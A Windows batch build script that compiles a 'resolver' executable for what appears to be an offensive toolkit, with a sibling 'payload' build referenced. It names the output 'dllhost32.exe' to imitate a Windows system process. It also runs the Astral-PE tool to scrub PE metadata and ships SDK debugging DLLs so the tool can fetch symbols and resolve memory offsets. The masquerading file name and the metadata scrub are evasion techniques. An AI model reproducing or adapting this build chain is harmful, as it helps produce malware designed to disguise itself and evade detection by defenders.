@echo off
setlocal enabledelayedexpansion

set ROOT=%~dp0..
set SHARED=%ROOT%\shared
set SRC=%~dp0src
set BUILD=%ROOT%\build\resolver
set OUT_NAME=dllhost32.exe

if not exist "%BUILD%" mkdir "%BUILD%"

where cl.exe >nul 2>nul
if not errorlevel 1 goto :HAVE_CL

set VSWHERE="%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if not exist %VSWHERE% (echo [!] vswhere missing & exit /b 1)
for /f "usebackq tokens=*" %%A in (`%VSWHERE% -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set VS_DIR=%%A
if "%VS_DIR%"=="" (echo [!] no VC++ tools & exit /b 1)
call "%VS_DIR%\VC\Auxiliary\Build\vcvars64.bat" >nul

:HAVE_CL

echo === Building %OUT_NAME% ===

set CFLAGS=/nologo /W3 /O2 /Oi /GS /Gy /MT /GL /DNDEBUG /D_CRT_SECURE_NO_WARNINGS /DWIN32_LEAN_AND_MEAN

REM  v-audit-hardening (2026-09-23) -- log_secure.c now calls
REM  svc_build_log_file_sa (from sec_attr.c) so newly-created log files
REM  start with a WMG-writable DACL. Must be added to the resolver's
REM  link line, else 'unresolved external symbol' at link time.
set SOURCES=^
 "%SHARED%\log_secure.c" "%SHARED%\log_key.c" ^
 "%SHARED%\str_enc.c" ^
 "%SHARED%\sec_attr.c" ^
 "%SRC%\main.c"

REM  Hardening: /CETCOMPAT (hardware ROP defence),
REM  /HIGHENTROPYVA /DYNAMICBASE /NXCOMPAT (ASLR + DEP),
REM  /GUARD:CF (Control Flow Guard — safe here, no shellcode).
REM  NOT using /DELAYLOAD:cgpt_dbghelp.dll because we explicitly
REM  LoadLibraryA it from the resolver's own directory to control
REM  which dbghelp version resolves (SDK version with symsrv support).
set LDFLAGS=/nologo /SUBSYSTEM:CONSOLE /LTCG /DEBUG:NONE /Brepro ^
 /OPT:REF /OPT:ICF /INCREMENTAL:NO /MANIFEST:NO ^
 /HIGHENTROPYVA /DYNAMICBASE /NXCOMPAT /CETCOMPAT /GUARD:CF ^
 /OUT:"%BUILD%\%OUT_NAME%"

cl %CFLAGS% /I "%SHARED%" /I "%SRC%" /guard:cf ^
   %SOURCES% ^
   /link %LDFLAGS% ^
   kernel32.lib user32.lib advapi32.lib bcrypt.lib

if errorlevel 1 (echo [!] Link failed. & exit /b 1)

del /q "%BUILD%\*.obj" 2>nul
del /q "%BUILD%\*.pdb" 2>nul
del /q "%BUILD%\*.exp" 2>nul
del /q "%BUILD%\*.lib" 2>nul

REM ── Astral-PE metadata scrub ── (see payload/build.bat for rationale)
set ASTRAL="%ROOT%\_bin\Astral-PE.exe"
if /I "%SVCLDB_SKIP_SCRUB%"=="1" (
    echo === Astral-PE scrub SKIPPED ^(SVCLDB_SKIP_SCRUB=1^) ===
    goto :AFTER_SCRUB
)
if not exist %ASTRAL% (
    echo === Astral-PE not found at %ASTRAL% - skipping scrub ===
    goto :AFTER_SCRUB
)
echo === Scrubbing %OUT_NAME% with Astral-PE ===
%ASTRAL% "%BUILD%\%OUT_NAME%" -o "%BUILD%\%OUT_NAME%.scrubbed" >nul 2>nul
if exist "%BUILD%\%OUT_NAME%.scrubbed" (
    move /y "%BUILD%\%OUT_NAME%.scrubbed" "%BUILD%\%OUT_NAME%" >nul
    echo === Scrub OK ===
) else (
    echo [!] Astral-PE scrub failed - shipping unscrubbed
)
:AFTER_SCRUB

REM ── Copy dbghelp + symsrv from the Windows SDK next to the resolver.
REM  The resolver LoadLibraryA's cgpt_dbghelp.dll from its own directory
REM  so it can pick the SDK version (with symsrv.dll support) over the
REM  limited System32 copy that ships with Windows itself.
REM
REM  If the SDK isn't installed, the resolver falls back to the System32
REM  dbghelp.dll at runtime — which cannot download PDBs from Microsoft's
REM  symbol server, so the offsets.blob resolution fails. Add the "Debugging
REM  Tools for Windows" component of the Windows SDK if this warning fires.
REM
REM  IMPORTANT: variable value is quoted at SET time so the `(x86)` parens
REM  inside the path don't confuse cmd.exe's block parser when we later
REM  use `if exist "..." (...)` — verified 2026-07 (see build.bat log).
set "SDK_DBG_DIR=C:\Program Files (x86)\Windows Kits\10\Debuggers\x64"
if exist "%SDK_DBG_DIR%\dbghelp.dll" goto :HAVE_SDK
echo === WARNING: Windows SDK Debuggers\x64 not found at %SDK_DBG_DIR% ===
echo === Resolver will fall back to System32 dbghelp — PDB fetching may fail. ===
goto :SIZE_ECHO
:HAVE_SDK
copy /y "%SDK_DBG_DIR%\dbghelp.dll" "%BUILD%\cgpt_dbghelp.dll" >nul
copy /y "%SDK_DBG_DIR%\symsrv.dll"  "%BUILD%\symsrv.dll"       >nul
echo === Copied cgpt_dbghelp.dll + symsrv.dll from Windows SDK ===
:SIZE_ECHO

for %%F in ("%BUILD%\%OUT_NAME%") do echo === Built %%F  (%%~zF bytes) ===
